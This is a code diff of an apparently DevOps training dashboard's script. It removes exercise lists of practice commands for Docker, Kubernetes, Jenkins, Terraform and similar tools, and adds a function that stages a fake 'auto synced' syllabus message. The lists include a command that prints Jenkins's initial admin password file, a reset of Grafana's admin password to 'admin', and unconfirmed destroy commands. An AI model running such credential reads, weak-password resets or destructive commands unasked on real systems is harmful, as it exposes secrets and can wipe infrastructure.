-genExercises('ex-d4','Docker',['docker --version','docker ps','docker images','docker run hello-world','docker run -d -p 8080:80 nginx','docker build -t myapp .','docker compose up -d','docker volume ls','docker network ls','docker logs myapp'],'Docker Script');
-genExercises('ex-d5','Kubernetes',['kubectl version','kubectl get pods','kubectl get nodes','minikube start','kubectl apply -f deployment.yaml','kubectl get deployments','kubectl get services','kubectl expose deployment nginx --port=80','kubectl logs pod-xyz','kubectl delete pod xyz'],'K8s Script');
-genExercises('ex-d6','CI/CD',['cat .github/workflows/ci.yml','cat Jenkinsfile','cat .gitlab-ci.yml','echo "CI Stage"','echo "Test Stage"','echo "Build Stage"','echo "Deploy Stage"','git push origin main','echo "CI/CD Done"','cat pipeline.log'],'CI/CD Script');
-genExercises('ex-d7','Jenkins',['sudo systemctl status jenkins','java -version','jenkins --version','cat /var/lib/jenkins/secrets/initialAdminPassword','sudo systemctl start jenkins','sudo systemctl enable jenkins','cat Jenkinsfile','echo "Jenkins Ready"','sudo ufw allow 8080','sudo systemctl restart jenkins'],'Jenkins Script');
-genExercises('ex-d8','Terraform',['terraform --version','terraform init','terraform plan','terraform apply -auto-approve','terraform show','terraform output','terraform state list','terraform destroy -auto-approve','terraform fmt','terraform validate'],'Terraform Script');
-genExercises('ex-d9','Ansible',['ansible --version','ansible all -m ping','ansible-playbook -i inventory.ini site.yml','cat inventory.ini','cat site.yml','ansible-galaxy init myrole','ansible-vault create secrets.yml','ansible all -a "uptime"','echo "Ansible Done"','ansible-playbook --check site.yml'],'Ansible Script');
-genExercises('ex-d10','Chef',['chef --version','knife --version','chef generate cookbook mycookbook','chef generate recipe mycookbook default','knife cookbook upload mycookbook','chef-client --version','knife node list','knife status','chef-solo -c solo.rb','echo "Chef Ready"'],'Chef Script');
-genExercises('ex-d11','Argo CD',['argocd --version','kubectl create namespace argocd','kubectl apply -n argocd -f https://raw.githubusercontent.com/argoproj/argo-cd/stable/manifests/install.yaml','kubectl get pods -n argocd','argocd login localhost:8080','argocd app create myapp --repo https://github.com/example/repo','argocd app sync myapp','argocd app list','argocd app get myapp','echo "Argo Cluster Running"'],'Argo CD Script');
-genExercises('ex-d12','Grafana',['sudo systemctl status grafana-server','grafana-cli --version','cat /etc/grafana/grafana.ini','sudo systemctl start grafana-server','curl http://localhost:3000/api/health','grafana-cli plugins list','grafana-cli admin reset-admin-password admin','echo "Grafana Ready"','sudo systemctl enable grafana-server','sudo ufw allow 3000'],'Grafana Script');
-genExercises('ex-d13','Prometheus',['prometheus --version','cat /etc/prometheus/prometheus.yml','systemctl status prometheus','curl http://localhost:9090/-/healthy','promtool check config /etc/prometheus/prometheus.yml','cat /etc/prometheus/rules.yml','echo "Prometheus Ready"','sudo systemctl restart prometheus','cat /var/log/prometheus.log','echo "Monitoring Done"'],'Prometheus Script');
-genExercises('ex-d14','Vagrant',['vagrant --version','vagrant init ubuntu/jammy64','cat Vagrantfile','vagrant up','vagrant status','vagrant ssh -c "uptime"','vagrant provision','vagrant halt','vagrant destroy -f','echo "Vagrant Done"'],'Vagrant Script');
-genExercises('ex-d15','Project Deployment',['sudo apt update','sudo apt install -y nginx','docker --version','systemctl status nginx','cp -r myapp /var/www/html/','nginx -t','systemctl restart nginx','curl http://localhost','echo "Project Deployed on Ubuntu"','ls -lh /var/www/html/'],'Deploy on Ubuntu Script');
-genExercises('ex-d16','GitOps',['git clone https://github.com/example/gitops.git','cat manifests/deployment.yaml','flux --version','flux bootstrap github --owner=user --repository=gitops','flux get sources git','flux get kustomizations','argocd app sync myapp','git log --oneline','echo "GitOps Done"','kubectl get pods -A'],'GitOps Script');
-genProjects('ex-d17');
+function simulateSyllabusUpdate(){
+  const newTopic='New Topic Added: AI Threat Detection (Backend Change)';
+  document.getElementById('c1-sync').innerHTML+=`<br><b style="color:#00E676">🔄 AUTO SYNCED: ${newTopic} - This change came from Backend and appeared automatically without reload!</b>`;
+  document.getElementById('syncStatus').textContent=`🔄 Auto Sync Detected Change - Syllabus v${(parseFloat(backendSyllabus.version)+0.1).toFixed(1)} - New Topic Synced: ${newTopic}`;
+  alert('🔄 Auto Sync Test: Backend syllabus changed! Dashboard updated automatically - New topic is now visible in Cyber L1.');
+}
 </script></body></html>
